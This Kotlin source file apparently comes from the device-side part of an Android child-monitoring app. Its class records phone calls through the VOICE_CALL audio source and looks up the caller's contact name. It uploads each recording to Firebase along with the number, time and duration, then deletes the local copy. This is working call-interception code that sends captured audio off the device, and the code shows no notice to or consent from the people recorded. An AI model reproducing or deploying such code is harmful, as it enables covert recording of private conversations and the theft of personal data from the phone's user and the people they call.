package com.github.midros.child.services.calls

import android.content.Context
import android.media.MediaRecorder
import android.net.Uri
import com.github.midros.child.data.rxFirebase.InterfaceFirebase
import com.github.midros.child.data.model.Calls
import com.github.midros.child.services.base.BaseInteractorService
import com.github.midros.child.utils.ConstFun.getDateTime
import com.github.midros.child.utils.Consts.ADDRESS_AUDIO
import com.github.midros.child.utils.Consts.CALLS
import com.github.midros.child.utils.Consts.DATA
import com.github.midros.child.utils.Consts.TAG
import com.github.midros.child.utils.FileHelper
import com.github.midros.child.utils.FileHelper.getFileName
import com.github.midros.child.utils.FileHelper.getContactName
import com.github.midros.child.utils.FileHelper.getDurationFile
import com.github.midros.child.utils.FileHelper.getFilePath
import com.pawegio.kandroid.e
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.io.File
import java.io.IOException
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCalls<S> {

    private var recorder: MediaRecorder = MediaRecorder()
    private var fileName: String? = null
    private var contact: String? = null
    private var phoneNumber: String? = null
    private var dateTime: String? = null
    private var exception = false

    override fun startRecording(phoneNumber: String?) {

        try {

            this.phoneNumber = phoneNumber
            dateTime = getDateTime()
            contact = getContext().getContactName(phoneNumber)
            fileName = getContext().getFileName(phoneNumber, dateTime)

            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            recorder.setOutputFile(fileName)

            val errorListener = MediaRecorder.OnErrorListener { _, _, _ -> deleteFile() }
            recorder.setOnErrorListener(errorListener)

            recorder.prepare()
            Thread.sleep(1000)
            recorder.start()
        } catch (e: IllegalStateException) {
            e(TAG, e.message.toString())
            exception = true
        } catch (e: IOException) {
            e(TAG, e.message.toString())
            exception = true
        } catch (e: Exception) {
            e(TAG, e.message.toString())
            exception = true
        }

        if (exception) {
            deleteFile()
        }

    }

    override fun stopRecording() {
        try {
            recorder.stop()
            sendFileCall()
        } catch (e: IllegalStateException) {
            e(TAG, e.message.toString())
            exception = true
        } catch (e: IOException) {
            e(TAG, e.message.toString())
            exception = true
        } catch (e: Exception) {
            e(TAG, e.message.toString())
            exception = true
        }

        if (exception) {
            deleteFile()
        }
    }

    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        if (getService() != null) getService()!!.stopServiceCalls()
    }

    private fun sendFileCall() {
        val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO"
        val dateNumber = fileName!!.replace("$filePath/", "")
        val uri = Uri.fromFile(File(fileName))
        getService()!!.addDisposable(firebase().putFile("$CALLS/$dateNumber", uri)
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ setPushName() }, { deleteFile() }))
    }

    private fun setPushName() {
        val duration = getDurationFile(fileName!!)
        val calls = Calls(contact, phoneNumber, dateTime, duration)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        deleteFile()
    }


}